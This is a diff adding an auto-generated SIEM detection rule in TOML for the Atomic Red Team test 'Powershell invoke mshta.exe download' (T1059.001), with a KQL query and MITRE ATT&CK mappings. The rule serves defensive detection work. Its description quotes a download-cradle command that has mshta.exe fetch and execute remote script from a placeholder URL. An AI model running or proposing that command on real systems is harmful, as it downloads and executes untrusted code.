@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Powershell invoke mshta.exe download' (GUID: 8a2ad40b-12c7-4b25-8521-2737b0a415af) of technique T1059.001 (Command and Scripting Interpreter: PowerShell). Test Description: Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \\\"Download Cradle test success!\\\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io. Command/Steps: C:\\\\Windows\\\\system32\\\\cmd.exe /c \\\"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\\\"\n"
+from = "now-9m"
+rule_id = "82e54841-5700-4829-8455-2428e0dd5f57"
+language = "kql"
+name = "Atomic Test: T1059.001 - Powershell invoke mshta.exe download"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1059.001/T1059.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1059.001", "8a2ad40b-12c7-4b25-8521-2737b0a415af", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*C:\\\\Windows\\\\system32\\\\cmd.exe*\\\" AND process.command_line : \\\"*mshta.exe*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1059.001"
+name = "Powershell invoke mshta.exe download"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+
